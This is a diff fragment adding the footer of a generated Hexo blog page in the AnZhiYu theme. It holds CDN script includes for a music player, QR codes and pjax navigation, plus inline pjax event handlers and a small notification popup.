+})()</script><input type="hidden" name="page-type" id="page-type" value="post"></div><script async data-pjax src="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/waterfall/waterfall.js"></script><script src="https://cdn.cbd.int/qrcodejs@1.0.0/qrcode.min.js"></script><script src="/js/anzhiyu/right_click_menu.js"></script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.9/icon/ali_iconfont_css.css"><script src="/js/console_egg.js"></script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/aplayer/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.cbd.int/anzhiyu-blog-static@1.0.1/js/APlayer.min.js"></script><script src="https://cdn.cbd.int/hexo-anzhiyu-music@1.0.1/assets/js/Meting2.min.js"></script><script src="https://cdn.cbd.int/pjax@0.2.8/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+var pjax = new Pjax({
+  elements: 'a:not([target="_blank"])',
+  selectors: pjaxSelectors,
+  cacheBust: false,
+  analytics: false,
+  scrollRestoration: false
+})
+
+document.addEventListener('pjax:send', function () {
+  // removeEventListener scroll 
+  anzhiyu.removeGlobalFnEvent('pjax')
+  anzhiyu.removeGlobalFnEvent('themeChange')
+
+  document.getElementById('rightside').classList.remove('rightside-show')
+  
+  if (window.aplayers) {
+    for (let i = 0; i < window.aplayers.length; i++) {
+      if (!window.aplayers[i].options.fixed) {
+        window.aplayers[i].destroy()
+      }
+    }
+  }
+
+  typeof typed === 'object' && typed.destroy()
+
+  //reset readmode
+  const $bodyClassList = document.body.classList
+  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
+})
+
+document.addEventListener('pjax:complete', function () {
+  window.refreshFn()
+
+  document.querySelectorAll('script[data-pjax]').forEach(item => {
+    const newScript = document.createElement('script')
+    const content = item.text || item.textContent || item.innerHTML || ""
+    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+    newScript.appendChild(document.createTextNode(content))
+    item.parentNode.replaceChild(newScript, item)
+  })
+
+  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()
+
+  typeof panguInit === 'function' && panguInit()
+
+  // google analytics
+  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});
+
+  // baidu analytics
+  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);
+
+  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
+
+  // prismjs
+  typeof Prism === 'object' && Prism.highlightAll()
+})
+
+document.addEventListener('pjax:error', e => {
+  if (e.request.status === 404) {
+    pjax.loadUrl('/404.html')
+  }
+})</script><script charset="UTF-8" src="https://cdn.cbd.int/anzhiyu-theme-static@1.1.5/accesskey/accesskey.js"></script></div><div id="popup-window"><div class="popup-window-title">通知</div><div class="popup-window-divider"></div><div class="popup-window-content"><div class="popup-tip">你好呀</div><div class="popup-link"><i class="anzhiyufont anzhiyu-icon-arrow-circle-right"></i></div></div></div></body></html>
